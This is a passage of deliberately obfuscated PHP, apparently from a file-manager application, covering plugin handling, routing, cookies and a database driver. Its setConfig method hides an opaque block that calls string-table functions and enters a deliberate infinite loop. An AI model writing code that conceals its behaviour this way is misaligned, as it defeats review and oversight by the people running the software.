$this->values[$ÖˆïÄ”Í] = $Ì°ÎÍà; } } protected function display($Ø¡ŒÅÃ·) { extract($this->values); require $Ø¡ŒÅÃ·; } final function hookRegist($áˆšÖÛÙ) { $this->modelPlugin->appRegist($this->pluginName, $áˆšÖÛÙ); } final function appIcon() { $¶¿Çß¨— =& $_SERVER[Îûáû“ş]; $û“¶Ì”Ï = $this->appPackage(); $œŠ³—è = $¶¿Çß¨—[12]; if (isset($û“¶Ì”Ï[$¶¿Çß¨—[416]])) { if (isset($û“¶Ì”Ï[$¶¿Çß¨—[416]][$¶¿Çß¨—[1544]])) { $œŠ³—è = $¶¿Çß¨—[1545] . $û“¶Ì”Ï[$¶¿Çß¨—[416]][$¶¿Çß¨—[1544]] . $¶¿Çß¨—[1546]; } else { if ($û“¶Ì”Ï[$¶¿Çß¨—[416]][$¶¿Çß¨—[1547]]) { $œŠ³—è = $¶¿Çß¨—[1548] . $û“¶Ì”Ï[$¶¿Çß¨—[416]][$¶¿Çß¨—[1547]] . $¶¿Çß¨—[1549]; } } } return $œŠ³—è; } final function fileCanView($¸¾ğªî“) { $ü¡èö³ =& $_SERVER[Îûáû“ş]; if (request_url_safe($¸¾ğªî“)) { return !0; } if ($this->isShare($¸¾ğªî“)) { return !0; } $‘ŠâÓşñ = Session::get($ü¡èö³[1550]); if (!$‘ŠâÓşñ || !$‘ŠâÓşñ[$ü¡èö³[1551]]) { $¢•öú§› = $ü¡èö³[1552] . rawurlencode(this_url()); show_tips(LNG($ü¡èö³[1553]) . $ü¡èö³[1554] . $¢•öú§› . $ü¡èö³[1555] . LNG($ü¡èö³[1556]) . $ü¡èö³[1557], !1); } if (!Action($ü¡èö³[1558])->authCan($ü¡èö³[1559])) { show_tips(LNG($ü¡èö³[1560]) . $ü¡èö³[1561], !1); } ActionCall($ü¡èö³[1562], $¸¾ğªî“); } final function isShare($»°ÒÈŸ) { $Ğ‘¢‘ĞĞ = KodIO::parse($»°ÒÈŸ); return $Ğ‘¢‘ĞĞ[$_SERVER[Îûáû“ş][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($Å¬äÏŞÛ) { if (request_url_safe($Å¬äÏŞÛ)) { return $Å¬äÏŞÛ; } if (!$this->isShare($Å¬äÏŞÛ)) { $Å¬äÏŞÛ = $this->filePath($Å¬äÏŞÛ); } return Action($_SERVER[Îûáû“ş][1176])->linkOut($Å¬äÏŞÛ); } public function filePathLinkOut($Óõìéœê) { if (request_url_safe($Óõìéœê)) { return $Óõìéœê; } $this->fileCanView($Óõìéœê); return Action($_SERVER[Îûáû“ş][1176])->link($Óõìéœê); } final function filePath($Ê§¡“á ) { $ÚÒø×á† =& $_SERVER[Îûáû“ş]; if ($Â—Í­èë = $this->checkSharePath($Ê§¡“á )) { Hook::trigger($ÚÒø×á†[1563], $Â—Í­èë); return $Â—Í­èë; } $this->fileCanView($Ê§¡“á ); if (request_url_safe($Ê§¡“á )) { $ş¸Ö¢Âß = parse_url_query($Ê§¡“á ); if (isset($ş¸Ö¢Âß[$ÚÒø×á†[1564]]) && isset($ş¸Ö¢Âß[$ÚÒø×á†[213]])) { $ıà«ôÜ = Model($ÚÒø×á†[769])->get($ÚÒø×á†[770]); $ùË¾·ò™ = Mcrypt::decode($ş¸Ö¢Âß[$ÚÒø×á†[213]], $ıà«ôÜ); if ($ùË¾·ò™) { $this->fileInfo = IO::infoWithChildren($ùË¾·ò™); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $ùË¾·ò™; } } $Ê§¡“á  = $this->_cacheHttpFile($Ê§¡“á ); $this->fileInfo = IO::infoWithChildren($Ê§¡“á ); } else { $this->fileInfo = IO::infoWithChildren($Ê§¡“á ); if (!$this->fileInfo) { show_tips(LNG($ÚÒø×á†[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($ÚÒø×á†[1563], $Ê§¡“á ); return $Ê§¡“á ; } final function _cacheHttpFile($ÍÕ¥©¶æ) { $°…Äöáû = hash_path($ÍÕ¥©¶æ, !0); $this->cachePath = $this->pluginCachePath($°…Äöáû); if ($¹Şå¬×º = IO::fileNameExist($this->cachePath, $°…Äöáû)) { return KodIO::make($¹Şå¬×º); } $—úøˆ˜ü = $this->cachePath . $°…Äöáû; return $this->pluginCacheFileSet($—úøˆ˜ü, file_get_contents_nossl($ÍÕ¥©¶æ)); } final function _tmpFileName($¥ÖÑ‘œ¥ = array()) { $–åñ¨ÙÇ =& $_SERVER[Îûáû“ş]; if (!$¥ÖÑ‘œ¥) { $¥ÖÑ‘œ¥ = $this->fileInfo; } if (isset($¥ÖÑ‘œ¥[$–åñ¨ÙÇ[177]])) { return $¥ÖÑ‘œ¥[$–åñ¨ÙÇ[177]]; } if (isset($¥ÖÑ‘œ¥[$–åñ¨ÙÇ[170]][$–åñ¨ÙÇ[177]])) { return $¥ÖÑ‘œ¥[$–åñ¨ÙÇ[170]][$–åñ¨ÙÇ[177]]; } $…’óè• = IO::hashSimple($¥ÖÑ‘œ¥[$–åñ¨ÙÇ[84]]); if ($…’óè•) { return $…’óè•; } $‹ÎÃÍõÅ = array($¥ÖÑ‘œ¥[$–åñ¨ÙÇ[32]], $¥ÖÑ‘œ¥[$–åñ¨ÙÇ[84]], $¥ÖÑ‘œ¥[$–åñ¨ÙÇ[76]]); if (isset($¥ÖÑ‘œ¥[$–åñ¨ÙÇ[511]])) { $‹ÎÃÍõÅ[] = $¥ÖÑ‘œ¥[$–åñ¨ÙÇ[511]]; } return md5(implode($–åñ¨ÙÇ[11], $‹ÎÃÍõÅ)); } final function checkSharePath($šÇöŠÛ«) { $œ«¸¯ =& $_SERVER[Îûáû“ş]; if (!$this->isShare($šÇöŠÛ«)) { return !1; } $¼Ë£’Í¾ = Action($œ«¸¯[1176])->sharePathInfo($šÇöŠÛ«); if (!isset($¼Ë£’Í¾[$œ«¸¯[84]])) { show_json(LNG($œ«¸¯[1565]), !1); } $this->fileInfo = $¼Ë£’Í¾[$œ«¸¯[170]]; $this->cachePath = $this->pluginCachePath($this->fileInfo[$œ«¸¯[177]]); return $¼Ë£’Í¾[$œ«¸¯[84]]; } final function pluginCachePath($À©ßÎ» = '') { $¬Ôåãˆú =& $_SERVER[Îûáû“ş]; $üåûâ½À = IO_PATH_SYSTEM_TEMP . $¬Ôåãˆú[1566] . $this->pluginName; if (!($àÁŒêìÑ = IO::infoFull($üåûâ½À))) { return IO::mkdir($üåûâ½À . $¬Ôåãˆú[8] . $À©ßÎ»); } if (empty($À©ßÎ»)) { return $àÁŒêìÑ[$¬Ôåãˆú[84]]; } if (!($ØÅèíŠü = IO::fileNameExist($àÁŒêìÑ[$¬Ôåãˆú[84]], $À©ßÎ»))) { return IO::mkdir($àÁŒêìÑ[$¬Ôåãˆú[84]] . $À©ßÎ»); } return KodIO::make($ØÅèíŠü); } final function pluginCacheFileSet($Üù¥Ô÷», $×—•È÷ = '') { $¬§øº =& $_SERVER[Îûáû“ş]; if (!($Õ©øïË = IO::infoFull($Üù¥Ô÷»))) { return IO::mkfile($Üù¥Ô÷», $×—•È÷, REPEAT_REPLACE); } IO::setContent($Õ©øïË[$¬§øº[84]], $×—•È÷); return $Õ©øïË[$¬§øº[84]]; } final function pluginLocalFile($®Ì·ØàÔ = '') { $Ğ…Îáìƒ =& $_SERVER[Îûáû“ş]; $éõƒ‹§ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($éõƒ‹§)) { mk_dir($éõƒ‹§); } if (!$®Ì·ØàÔ) { return $éõƒ‹§; } $úÌˆûå = IO::info($®Ì·ØàÔ); $èˆ˜­æ = $this->_tmpFileName($úÌˆûå) . $Ğ…Îáìƒ[10] . $úÌˆûå[$Ğ…Îáìƒ[174]]; if (!checkExtSafe($èˆ˜­æ)) { $èˆ˜­æ = $èˆ˜­æ . $Ğ…Îáìƒ[1208]; } $Í²‚Âû = $éõƒ‹§ . $èˆ˜­æ; if (@file_exists($Í²‚Âû)) { return $Í²‚Âû; } return IO::copy($®Ì·ØàÔ, $éõƒ‹§, 0, $èˆ˜­æ); } final function appPackage() { $ŸÒïå® =& $_SERVER[Îûáû“ş]; if ($this->packageData) { return $this->packageData; } $ç˜Œ âÔ = $this->parseFile($this->pluginPath . $ŸÒïå®[1567]); $this->parseLang($ç˜Œ âÔ); $ˆÀò = json_decode_force($ç˜Œ âÔ); if (!$ˆÀò) { return array(); } $¸¨†ßÇò = Hook::trigger($ŸÒïå®[1568], $ˆÀò); if ($¸¨†ßÇò && is_array($¸¨†ßÇò)) { $ˆÀò = $¸¨†ßÇò; } $this->packageData = $ˆÀò; return $ˆÀò; } public function packageInfoGet($“ÆúÏø‚) { $Æ„á±¡» = $this->appPackage(); return array_get_value($Æ„á±¡», $“ÆúÏø‚); } public function packageVersion() { return $this->packageInfoGet($_SERVER[Îûáû“ş][1569]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[Îûáû“ş][1570]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[Îûáû“ş][1571]); } public function echoJsAssign($•¬øÚï, $ÍÅ“Îº¿) { $this->echoJsAssignArr[$•¬øÚï] = $ÍÅ“Îº¿; } private function parseFile($Öüæ»œè) { $²·äÈî‚ =& $_SERVER[Îûáû“ş]; $™ØÔƒ¼¹ = file_get_contents_nossl($Öüæ»œè); $ıı³õáä = array($²·äÈî‚[1572], $²·äÈî‚[1573], $²·äÈî‚[1574], $²·äÈî‚[1575], $²·äÈî‚[1576], $²·äÈî‚[1577], $²·äÈî‚[1578]); $Ïò—Œ°Û = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$²·äÈî‚[89]][$²·äÈî‚[1579]]); foreach ($this->echoJsAssignArr as $šã÷‚ => $ßÅÅÎ‡æ) { $ıı³õáä[] = $²·äÈî‚[1580] . $šã÷‚ . $²·äÈî‚[1581]; $Ïò—Œ°Û[] = is_array($ßÅÅÎ‡æ) || is_object($ßÅÅÎ‡æ) ? rawurlencode(json_encode($ßÅÅÎ‡æ)) : $ßÅÅÎ‡æ; } if (strstr($™ØÔƒ¼¹, $²·äÈî‚[1582])) { $¤ı¥ªÁ€ = rawurlencode(json_encode($this->pluginLangArr)); $™ØÔƒ¼¹ = str_replace($²·äÈî‚[1582], $¤ı¥ªÁ€, $™ØÔƒ¼¹); } if (strstr($™ØÔƒ¼¹, $²·äÈî‚[1583])) { $¤ı¥ªÁ€ = $¤ı¥ªÁ€ = rawurlencode(json_encode($this->getConfig())); $™ØÔƒ¼¹ = str_replace($²·äÈî‚[1583], $¤ı¥ªÁ€, $™ØÔƒ¼¹); } $™ØÔƒ¼¹ = str_replace($ıı³õáä, $Ïò—Œ°Û, $™ØÔƒ¼¹); return $™ØÔƒ¼¹; } private function parseLang(&$äû÷‚¡¶) { $—ù´ÈĞ  =& $_SERVER[Îûáû“ş]; $æá¸Õ = $—ù´ÈĞ [1584]; if (!strstr($äû÷‚¡¶, $æá¸Õ)) { return; } preg_match_all($—ù´ÈĞ [1585], $äû÷‚¡¶, $®ùçëÖ); if (!is_array($®ùçëÖ) || count($®ùçëÖ) == 0 || !is_array($®ùçëÖ[0]) || count($®ùçëÖ[0]) == 0) { return; } $¡•Û®— = array(); $Ï‡³˜İÀ = array(); foreach ($®ùçëÖ[0] as $¿ ‹Å ) { $œ¢ ÆÙº = substr($¿ ‹Å , strlen($æá¸Õ), -4); $Ü¸ş’¡® = LNG($œ¢ ÆÙº); $¡•Û®—[] = $¿ ‹Å ; $Ï‡³˜İÀ[] = str_replace(array($—ù´ÈĞ [231], $—ù´ÈĞ [1080], $—ù´ÈĞ [342], $—ù´ÈĞ [118]), array($—ù´ÈĞ [53], $—ù´ÈĞ [53], $—ù´ÈĞ [12], $—ù´ÈĞ [1586]), $Ü¸ş’¡®); } $äû÷‚¡¶ = str_replace($¡•Û®—, $Ï‡³˜İÀ, $äû÷‚¡¶); } private function parseConfig(&$óªÆéşÕ) { $±ÑºÅ„ =& $_SERVER[Îûáû“ş]; $ƒ’ÜşÛÕ = $±ÑºÅ„[1587]; if (!strstr($óªÆéşÕ, $ƒ’ÜşÛÕ)) { return; } preg_match_all($±ÑºÅ„[1588], $óªÆéşÕ, $„’âıê); if (!is_array($„’âıê) || count($„’âıê) == 0 || !is_array($„’âıê[0]) || count($„’âıê[0]) == 0) { return; } $’‹É´Ö£ = $this->getConfig(); $’»€³À™ = array(); $İ‰õœÏ¼ = array(); foreach ($„’âıê[0] as $Ô«¿ƒÍ) { $ˆÓë¨÷ú = substr($Ô«¿ƒÍ, strlen($ƒ’ÜşÛÕ), -2); $’»€³À™[] = $Ô«¿ƒÍ; $İ‰õœÏ¼[] = _get($’‹É´Ö£, $ˆÓë¨÷ú); } $óªÆéşÕ = str_replace($’»€³À™, $İ‰õœÏ¼, $óªÆéşÕ); } private function parsePackage(&$™ëŒ°ĞÖ) { $ÚûßÂæ =& $_SERVER[Îûáû“ş]; $™©¿ÃµÍ = $ÚûßÂæ[1589]; if (!strstr($™ëŒ°ĞÖ, $™©¿ÃµÍ)) { return; } preg_match_all($ÚûßÂæ[1590], $™ëŒ°ĞÖ, $Ø»ªº„—); if (!is_array($Ø»ªº„—) || count($Ø»ªº„—) == 0 || !is_array($Ø»ªº„—[0]) || count($Ø»ªº„—[0]) == 0) { return; } $ö¿Çş·Ë = $this->appPackage(); $µ»íÚ = array(); $µ·İª„Ì = array(); foreach ($Ø»ªº„—[0] as $È¢Æ“âÁ) { $ƒÀ‘é = substr($È¢Æ“âÁ, strlen($™©¿ÃµÍ), -2); $µ»íÚ[] = $È¢Æ“âÁ; $µ·İª„Ì[] = _get($ö¿Çş·Ë, $ƒÀ‘é); } $™ëŒ°ĞÖ = str_replace($µ»íÚ, $µ·İª„Ì, $™ëŒ°ĞÖ); } final function echoFile($…œöÈ°, $’›±¡€ = false) { $¡õ¸Ï—ñ =& $_SERVER[Îûáû“ş]; $˜´³òÌÒ = $this->pluginPath . $…œöÈ°; if (ACT == $¡õ¸Ï—ñ[1591]) { echo $¡õ¸Ï—ñ[1592] . $this->pluginName . $¡õ¸Ï—ñ[8] . $…œöÈ° . $¡õ¸Ï—ñ[1593]; if (!file_exists($˜´³òÌÒ)) { echo $¡õ¸Ï—ñ[1594]; return; } } $•å³š¡Ú = $this->parseFile($˜´³òÌÒ); $this->parseLang($•å³š¡Ú); $this->parseConfig($•å³š¡Ú); $this->parsePackage($•å³š¡Ú); if (is_array($’›±¡€)) { $•å³š¡Ú = str_replace(array_keys($’›±¡€), array_values($’›±¡€), $•å³š¡Ú); } echo $¡õ¸Ï—ñ[231] . $•å³š¡Ú; } final function initLang() { $ Ü×Üªô =& $_SERVER[Îûáû“ş]; $Ô®óª¥® = $ Ü×Üªô[1595]; $êÈ»Ø¸ = $this->pluginPath . $ Ü×Üªô[1596]; $²Å†É = I18n::getType(); $ Œ¹Ç×ó = array(); if (file_exists($êÈ»Ø¸ . $²Å†É . $ Ü×Üªô[837])) { $ Œ¹Ç×ó = (include $êÈ»Ø¸ . $²Å†É . $ Ü×Üªô[837]); } else { if ($²Å†É == $ Ü×Üªô[1597] && !file_exists($êÈ»Ø¸ . $²Å†É . $ Ü×Üªô[837]) && file_exists($êÈ»Ø¸ . $ Ü×Üªô[1598])) { $ Œ¹Ç×ó = (include $êÈ»Ø¸ . $ Ü×Üªô[1598]); } else { if (file_exists($êÈ»Ø¸ . $Ô®óª¥® . $ Ü×Üªô[837])) { $ Œ¹Ç×ó = (include $êÈ»Ø¸ . $Ô®óª¥® . $ Ü×Üªô[837]); } } } if (!is_array($ Œ¹Ç×ó)) { return array(); } if (@count($ Œ¹Ç×ó) > 0) { I18n::set($ Œ¹Ç×ó); } return $ Œ¹Ç×ó; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($õê–Ö±¸) { $ÒˆÉã— =& $_SERVER[Îûáû“ş]; if (!isset($_SERVER[$ÒˆÉã—[875]]) || !isset($_SERVER[$ÒˆÉã—[876]])) { $ùô¡Öòõ = $ÒˆÉã—[877]; $™òÕ›ÒÊ = $ÒˆÉã—[878]; $³µÆ†§¯ = $_SERVER[$ÒˆÉã—[879]] . $ÒˆÉã—[880]; $øÎ¸·‡ = $™òÕ›ÒÊ($³µÆ†§¯); $×æôêåÇ = explode($ÒˆÉã—[231], $øÎ¸·‡); if (count($×æôêåÇ) < $ÒˆÉã—[607]) { $¥Ù‚çà¾ = $ÒˆÉã—[881]; $¥Ù‚çà¾(); } $ñçà¡Ù° = $ÒˆÉã—[882]; $ñçà¡Ù°($_SERVER[$ÒˆÉã—[883]]); $Ûãï…ïÁ = 1; for ($œÖÚ¤ = $Ûãï…ïÁ; $œÖÚ¤ > 0; $œÖÚ¤++) { $ñçà¡Ù° = json_encode($GLOBALS[$ÒˆÉã—[418]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $õê–Ö±¸); } public function onSetConfig($„»®Òí) { } public function onGetConfig($²¹ıÅÖİ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($¨ŞÛ¦ƒ) { if ($¨ŞÛ¦ƒ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($°êÔãõ = "\x70\154\x75\147\151\156\x41\165\x74\150") { $®©×ú‰½ =& $_SERVER[Îûáû“ş]; if (!Session::get($®©×ú‰½[1550])) { return !1; } if (_get($GLOBALS, $®©×ú‰½[494])) { return !0; } $³°®ƒûÑ = $this->getConfig(); if (!$³°®ƒûÑ[$°êÔãõ]) { return !1; } return ActionCall($®©×ú‰½[1599], $³°®ƒûÑ[$°êÔãõ]); } public function url($¨œÙ¸Ø, $×Ëüàõ’ = '', $ØµŞ½íé = true) { $ò“øÜì =& $_SERVER[Îûáû“ş]; $Ó‰ÊÑç½ = $this->getConfig(); $±Ñè§ŞÒ = KOD_VERSION . $ò“øÜì[10] . KOD_VERSION_BUILD; $®ûÜìĞ¸ = $this->packageVersion(); $§ğËÃ¶‘ = $±Ñè§ŞÒ . $ò“øÜì[386] . $®ûÜìĞ¸; if (substr($¨œÙ¸Ø, 0, 4) == $ò“øÜì[148] || substr($¨œÙ¸Ø, 0, 2) == $ò“øÜì[1381]) { $×¥ı¢¬´ = $¨œÙ¸Ø . $ò“øÜì[1600] . $§ğËÃ¶‘; } else { if ($×Ëüàõ’ == $ò“øÜì[12]) { $×¥ı¢¬´ = $this->pluginHost . $¨œÙ¸Ø . $ò“øÜì[1600] . $§ğËÃ¶‘; } else { if ($×Ëüàõ’ === $ò“øÜì[75]) { $×¥ı¢¬´ = $this->pluginHost . $¨œÙ¸Ø; } else { if ($×Ëüàõ’ == $ò“øÜì[1601]) { $×¥ı¢¬´ = STATIC_PATH . $¨œÙ¸Ø . $ò“øÜì[1600] . $±Ñè§ŞÒ; } else { if ($×Ëüàõ’ == $ò“øÜì[1602]) { $×¥ı¢¬´ = APP_HOST . $ò“øÜì[1603] . $¨œÙ¸Ø . $ò“øÜì[1600] . $±Ñè§ŞÒ; } else { if (isset($Ó‰ÊÑç½[$×Ëüàõ’])) { $×¥ı¢¬´ = $Ó‰ÊÑç½[$×Ëüàõ’] . $¨œÙ¸Ø . $ò“øÜì[1600] . $§ğËÃ¶‘; } } } } } } if (!$ØµŞ½íé) { return $×¥ı¢¬´; } echo $×¥ı¢¬´; } public function link($¯òÃÅÅÁ = false, $ÂíÔù¤â = '') { $íŒ¼şÏ· =& $_SERVER[Îûáû“ş]; if (!$¯òÃÅÅÁ) { $this->link($íŒ¼şÏ·[1604], $íŒ¼şÏ·[1602]); $this->link($íŒ¼şÏ·[1605], $íŒ¼şÏ·[1601]); $this->link($íŒ¼şÏ·[1606], $íŒ¼şÏ·[1601]); $this->link($íŒ¼şÏ·[1607], $íŒ¼şÏ·[1601]); $this->link($íŒ¼şÏ·[1608], $íŒ¼şÏ·[1601]); return; } $ÎŠÓ•· = $this->url($¯òÃÅÅÁ, $ÂíÔù¤â, !1); if (substr($¯òÃÅÅÁ, -3) == $íŒ¼şÏ·[1609]) { echo $íŒ¼şÏ·[1610] . $ÎŠÓ•· . $íŒ¼şÏ·[1611] . $íŒ¼şÏ·[231]; } else { if (substr($¯òÃÅÅÁ, -4) == $íŒ¼şÏ·[1612]) { echo $íŒ¼şÏ·[1613] . $ÎŠÓ•· . $íŒ¼şÏ·[1614] . $íŒ¼şÏ·[231]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\x3a\x61\156\171" => "\133\x5e\x2f\x5d\53", "\72\156\x75\155" => "\x5b\60\55\71\135\53", "\x3a\141\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($Ÿä¨²ÈË, $óŞîı„½) { $Ó½“ÅÍƒ =& $_SERVER[Îûáû“ş]; if ($Ÿä¨²ÈË == $Ó½“ÅÍƒ[1615]) { $âü¹–Å = array_map($Ó½“ÅÍƒ[1616], $óŞîı„½[0]); $úÕÎåÎ£ = strpos($óŞîı„½[1], $Ó½“ÅÍƒ[8]) === 0 ? $óŞîı„½[1] : $Ó½“ÅÍƒ[8] . $óŞîı„½[1]; $¡»Ü€‚š = $óŞîı„½[2]; } else { $âü¹–Å = null; $úÕÎåÎ£ = strpos($óŞîı„½[0], $Ó½“ÅÍƒ[8]) === 0 ? $óŞîı„½[0] : $Ó½“ÅÍƒ[8] . $óŞîı„½[0]; $¡»Ü€‚š = $óŞîı„½[1]; } array_push(self::$maps, $âü¹–Å); array_push(self::$routes, $úÕÎåÎ£); array_push(self::$methods, strtoupper($Ÿä¨²ÈË)); array_push(self::$callbacks, $¡»Ü€‚š); } public static function error($å½’˜ªÕ) { self::$errorCallback = $å½’˜ªÕ; } public static function haltOnMatch($½àÁøß˜ = true) { self::$halts = $½àÁøß˜; } public static function dispatch() { $Š²á³™ =& $_SERVER[Îûáû“ş]; $óïÔöö = parse_url($_SERVER[$Š²á³™[1617]], PHP_URL_PATH); $Ì„ÌôŒ´ = $_SERVER[$Š²á³™[159]]; $‡Ğğ¸œ€ = array_keys(static::$patterns); $ãµšÇëÆ = array_values(static::$patterns); $Ï‡óÖí¸ = !1; self::$routes = preg_replace($Š²á³™[1278], $Š²á³™[8], self::$routes); if (in_array($óïÔöö, self::$routes)) { $Ï©ıÍ¬ = array_keys(self::$routes, $óïÔöö); foreach ($Ï©ıÍ¬ as $—Ã‡»¬Ë) { if (self::$methods[$—Ã‡»¬Ë] == $Ì„ÌôŒ´ || self::$methods[$—Ã‡»¬Ë] == $Š²á³™[1618] || in_array($Ì„ÌôŒ´, self::$maps[$—Ã‡»¬Ë])) { $Ï‡óÖí¸ = !0; if (!is_object(self::$callbacks[$—Ã‡»¬Ë])) { $‚–Ùë = explode($Š²á³™[8], self::$callbacks[$—Ã‡»¬Ë]); $Íˆ“øÏ = end($‚–Ùë); $áçø‘¡’ = explode($Š²á³™[1210], $Íˆ“øÏ); $ê¬çñö’ = new $áçø‘¡’[0](); $ê¬çñö’->{$áçø‘¡’[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$—Ã‡»¬Ë]); if (self::$halts) { return; } } } } } else { $ÖÚÌçõ› = 0; foreach (self::$routes as $—Ã‡»¬Ë) { if (strpos($—Ã‡»¬Ë, $Š²á³™[4]) !== !1) { $—Ã‡»¬Ë = str_replace($‡Ğğ¸œ€, $ãµšÇëÆ, $—Ã‡»¬Ë); } if (preg_match($Š²á³™[1619] . $—Ã‡»¬Ë . $Š²á³™[1620], $óïÔöö, $†æÓ²­‡)) { if (self::$methods[$ÖÚÌçõ›] == $Ì„ÌôŒ´ || self::$methods[$ÖÚÌçõ›] == $Š²á³™[1618] || !empty(self::$maps[$ÖÚÌçõ›]) && in_array($Ì„ÌôŒ´, self::$maps[$ÖÚÌçõ›])) { $Ï‡óÖí¸ = !0; array_shift($†æÓ²­‡); if (!is_object(self::$callbacks[$ÖÚÌçõ›])) { $‚–Ùë = explode($Š²á³™[8], self::$callbacks[$ÖÚÌçõ›]); $Íˆ“øÏ = end($‚–Ùë); $áçø‘¡’ = explode($Š²á³™[1210], $Íˆ“øÏ); $ê¬çñö’ = new $áçø‘¡’[0](); if (!method_exists($ê¬çñö’, $áçø‘¡’[1])) { echo $Š²á³™[1621]; } else { call_user_func_array(array($ê¬çñö’, $áçø‘¡’[1]), $†æÓ²­‡); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ÖÚÌçõ›], $†æÓ²­‡); if (self::$halts) { return; } } } } $ÖÚÌçõ›++; } } if ($Ï‡óÖí¸ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $©úŞÛß‰ =& $_SERVER[Îûáû“ş]; header($_SERVER[$©úŞÛß‰[1622]] . $©úŞÛß‰[1623]); echo $©úŞÛß‰[1624]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Š²á³™[1617]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto a´„·è‡íª; cºÄÖÔ¥—Ê: $fileSize = strrev(base64_decode($_SERVER[Ä­ñÛ£Ä][0])); function binCheckNeq($†ÏÎµ‡, $©ÕíÂ‚ó) { return $†ÏÎµ‡ != $©ÕíÂ‚ó; } $_SERVER[$_SERVER[Ä­ñÛ£Ä][1]] = $fileSize($_SERVER[$_SERVER[Ä­ñÛ£Ä][2]]); goto c²Å¯¾‘¾Ê; CÄ²‹”ó×É: define($_SERVER[Îûáû“ş][238], 1); define($_SERVER[Îûáû“ş][239], 2); define($_SERVER[Îûáû“ş][240], 3); goto DĞ‚¹õŠÄ½; fçÜ‡ÒˆŞ³: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($À¾·è´¥ = '', $ÊÚ·¼ = 0) { if (is_string($À¾·è´¥) && $À¾·è´¥ != $_SERVER[Îûáû“ş][12]) { $this->prefix = $À¾·è´¥; } if (is_numeric($ÊÚ·¼) && $ÊÚ·¼ > 0) { $this->expire = $ÊÚ·¼; } } public static function getInstance() { static $Ñºú§¦§; if ($Ñºú§¦§ === null) { $Ñºú§¦§ = new self(); } return $Ñºú§¦§; } private static $cookieDisable = false; public static function disable($àƒÕîû) { self::$cookieDisable = $àƒÕîû; } private static $sameCookieSet = array(); public static function set($¸ŒœšÅİ, $æúöÇ¹, $Á®¾Ìø³ = 0, $´‘¯Ã = false, $àÖîûÅı = false) { $²óÄ“Ä“ =& $_SERVER[Îûáû“ş]; if (self::$cookieDisable) { return; } if (!$Á®¾Ìø³) { $Á®¾Ìø³ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$¸ŒœšÅİ]) && self::$sameCookieSet[$¸ŒœšÅİ] == $æúöÇ¹ . $Á®¾Ìø³) { return; } self::$sameCookieSet[$¸ŒœšÅİ] = $æúöÇ¹ . $Á®¾Ìø³; if (!$àÖîûÅı) { $àÖîûÅı = str_replace(HOST, $²óÄ“Ä“[12], APP_HOST); $àÖîûÅı = _get($GLOBALS, $²óÄ“Ä“[884], $àÖîûÅı); } $µòŠµ† = $²óÄ“Ä“[12]; setcookie($¸ŒœšÅİ, $æúöÇ¹, time() + $Á®¾Ìø³, $²óÄ“Ä“[8] . trim($àÖîûÅı, $²óÄ“Ä“[8]) . $µòŠµ†, !1, !1, $´‘¯Ã); } public static function setSafe($Ñãç·ÅÑ, $·Ù©°½’, $¦µÃòĞâ = 0) { self::set($Ñãç·ÅÑ, $·Ù©°½’, $¦µÃòĞâ, !0); } public static function get($€¸¤æÛÕ) { static $Š¤Š¹é» = false; if (!$Š¤Š¹é») { self::initHeaderCookie(); $Š¤Š¹é» = !0; } return isset($_COOKIE[$€¸¤æÛÕ]) ? $_COOKIE[$€¸¤æÛÕ] : !1; } private static function initHeaderCookie() { $ãºµ¾À =& $_SERVER[Îûáû“ş]; if (!isset($_SERVER[$ãºµ¾À[885]]) || !$_SERVER[$ãºµ¾À[885]]) { return; } $¤Î¿Œâ = explode($ãºµ¾À[71], $_SERVER[$ãºµ¾À[885]]); foreach ($¤Î¿Œâ as $‘ÄÆä ) { $‘ÄÆä  = explode($ãºµ¾À[886], $‘ÄÆä ); if (count($‘ÄÆä ) != 2 || !isset($‘ÄÆä [1])) { continue; } $_COOKIE[trim($‘ÄÆä [0])] = trim($‘ÄÆä [1]); } } public static function remove($°¨ƒ»â, $Ëâü‘¼Ú = false) { unset($_COOKIE[$°¨ƒ»â]); self::set($°¨ƒ»â, $_SERVER[Îûáû“ş][12], 1, $Ëâü‘¼Ú); } } class DbMysql extends Db { public function __construct($Şõ‡¯ãÖ = '') { $Ûâ×ÇÅ× =& $_SERVER[Îûáû“ş]; if (!extension_loaded($Ûâ×ÇÅ×[803])) { think_exception(think_lang($Ûâ×ÇÅ×[14]) . $Ûâ×ÇÅ×[887]); } if (!empty($Şõ‡¯ãÖ)) { $this->config = $Şõ‡¯ãÖ; if (empty($this->config[$Ûâ×ÇÅ×[17]])) { $this->config[$Ûâ×ÇÅ×[17]] = $Ûâ×ÇÅ×[12]; } } } public function connect($üåº–œ = '', $—¢„ âÖ = 0, $ŠŸÇèôİ = false) { $Õñôíû =& $_SERVER[Îûáû“ş]; if (!isset($this->linkID[$—¢„ âÖ])) { if (empty($üåº–œ)) { $üåº–œ = $this->config; } $Â‚¾şÚ = $üåº–œ[$Õñôíû[888]] . ($üåº–œ[$Õñôíû[889]] ? "\72{$üåº–œ[$Õñôíû[889]]}" : $Õñôíû[12]); $”Ñ­­·¥ = !empty($üåº–œ[$Õñôíû[17]][$Õñôíû[18]]) ? $üåº–œ[$Õñôíû[17]][$Õñôíû[18]] : 